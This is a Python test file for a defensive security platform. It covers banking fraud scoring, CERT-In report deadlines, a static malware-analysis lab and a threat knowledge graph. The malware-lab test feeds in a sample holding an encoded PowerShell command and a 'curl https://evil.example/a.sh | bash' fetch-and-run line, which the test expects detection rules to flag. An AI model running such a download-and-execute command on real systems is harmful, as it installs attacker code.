"""Phase 4 automated tests: Banking Fraud, Gov CERT-In SLA, Defensive Malware Lab, Knowledge Graph."""
import json
import tempfile
import threading
import unittest
import urllib.error
import urllib.request
from pathlib import Path

from backend.app import create_server


class VajrakavachPhase4Tests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmpdir = tempfile.TemporaryDirectory()
        self.db_path = Path(self.tmpdir.name) / "test_phase4.db"
        self.server = create_server("127.0.0.1", 0, self.db_path)
        self.port = self.server.server_address[1]
        self.base_url = f"http://127.0.0.1:{self.port}"
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()

        _, reg = self._req("POST", "/api/v1/auth/register-tenant", {
            "tenant_name": "Bharat Reserve Cyber Defense",
            "sector": "banking",
            "full_name": "Divyesh Bambhaniya",
            "email": "phase4@vajrakavach.example",
            "password": "StrongPhase4Password!",
        })
        self.token = reg["token"]

    def tearDown(self) -> None:
        self.server.shutdown()
        self.server.server_close()
        self.tmpdir.cleanup()

    def _req(self, method: str, path: str, body=None, token: str = ""):
        headers = {"Content-Type": "application/json"}
        if token:
            headers["Authorization"] = f"Bearer {token}"
        data = json.dumps(body).encode("utf-8") if body is not None else None
        req = urllib.request.Request(f"{self.base_url}{path}", data=data, headers=headers, method=method)
        try:
            with urllib.request.urlopen(req) as resp:
                return resp.status, json.loads(resp.read().decode("utf-8"))
        except urllib.error.HTTPError as err:
            try:
                return err.code, json.loads(err.read().decode("utf-8"))
            finally:
                err.close()

    def test_banking_fraud_anomaly_and_velocity(self) -> None:
        s1, tx1 = self._req("POST", "/api/v1/banking/transactions", {
            "account_alias": "ACCT-9001",
            "amount_inr": 99000,
            "channel": "UPI",
            "counterparty": "UNKNOWN-MERCHANT",
            "new_device_or_geo": True,
        }, self.token)
        self.assertEqual(s1, 201)
        self.assertTrue(tx1["advisory_only"])
        self.assertIn("HIGH_VALUE_UPI_LIMIT_PROXIMITY", tx1["triggered_rules"])
        self.assertIn("NEW_DEVICE_OR_GEO_ANOMALY", tx1["triggered_rules"])
        self.assertGreaterEqual(tx1["anomaly_score"], 55)

    def test_gov_certin_6h_sla_drafter(self) -> None:
        s, rep = self._req("POST", "/api/v1/gov/certin-reports", {
            "incident_category": "compromise_critical_system",
            "affected_service": "National Digital Payment Switch",
            "detected_at": "2026-11-20T04:00:00Z",
            "summary": "Unauthorized administrative login attempt blocked and isolated.",
        }, self.token)
        self.assertEqual(s, 201)
        self.assertEqual(rep["deadline_utc"], "2026-11-20T10:00:00Z")
        self.assertTrue(rep["report_draft"]["human_verification_required"])

    def test_defensive_malware_static_lab(self) -> None:
        sample = "powershell.exe -enc SQBFAFgA... curl https://evil.example/a.sh | bash 198.51.100.99"
        s, res = self._req("POST", "/api/v1/malware-lab/analyze", {
            "sample_name": "dropper_note.txt",
            "sample_text": sample,
        }, self.token)
        self.assertEqual(s, 201)
        self.assertFalse(res["execution_performed"])
        self.assertGreater(res["shannon_entropy"], 3.0)
        rule_names = {r["rule"] for r in res["matched_rules"]}
        self.assertIn("DEF_ENCODED_POWERSHELL", rule_names)
        self.assertIn("DEF_SHELL_DOWNLOAD_EXEC", rule_names)
        self.assertIn("198.51.100.99", res["indicators"]["ipv4_addresses"])

    def test_security_knowledge_graph_links_entities(self) -> None:
        _, asset = self._req("POST", "/api/v1/assets", {
            "name": "Core UPI Switch",
            "asset_type": "api",
            "criticality": "critical",
        }, self.token)
        self._req("POST", "/api/v1/risks", {
            "asset_id": asset["id"],
            "title": "Token Replay Risk",
            "likelihood": 4,
            "impact": 5,
        }, self.token)
        _, ev = self._req("POST", "/api/v1/soc/events", {
            "asset_id": asset["id"],
            "source": "suricata",
            "event_type": "c2_alert",
            "severity": "critical",
            "summary": "Connection to 203.0.113.55 detected",
        }, self.token)
        self._req("POST", "/api/v1/threat-intel/iocs", {
            "ioc_type": "ip",
            "indicator": "203.0.113.55",
        }, self.token)
        self._req("POST", "/api/v1/evidence", {
            "case_id": ev["correlated_case_id"],
            "title": "Switch Log Extract",
            "source": "UPI Switch",
            "content_payload": "src=10.1.1.5 dst=203.0.113.55",
        }, self.token)

        s, graph = self._req("GET", "/api/v1/graph/security", token=self.token)
        self.assertEqual(s, 200)
        self.assertGreaterEqual(graph["stats"]["total_nodes"], 6)
        relations = {e["relation"] for e in graph["edges"]}
        self.assertIn("HAS_RISK", relations)
        self.assertIn("GENERATED_EVENT", relations)
        self.assertIn("ESCALATED_TO", relations)
        self.assertIn("HAS_EVIDENCE", relations)
        self.assertIn("MATCHES_IOC", relations)


if __name__ == "__main__":
    unittest.main()
